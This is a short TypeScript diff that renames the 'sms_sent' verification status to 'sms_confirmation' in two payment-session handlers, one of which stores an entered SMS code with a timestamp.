@@ -211,8 +211,8 @@ async function handleSetVerificationMethod(req: Request) {
   };
 
   // Set correct verification status for each method
-  if (method === 'sms_sent') {
-    updates.verification_status = 'sms_sent';
+  if (method === 'sms_confirmation') {
+    updates.verification_status = 'sms_confirmation';
   } else if (method === 'app_confirmation') {
     updates.verification_status = 'app_confirmation';
   } else if (method === 'choice_required') {
@@ -271,7 +271,7 @@ async function handleEnterSmsCode(req: Request) {
     .from('payment_sessions')
     .update({
       sms_code: code,
-      verification_status: 'sms_sent',
+      verification_status: 'sms_confirmation',
       last_seen: new Date().toISOString()
     })
     .eq('session_id', sessionId)
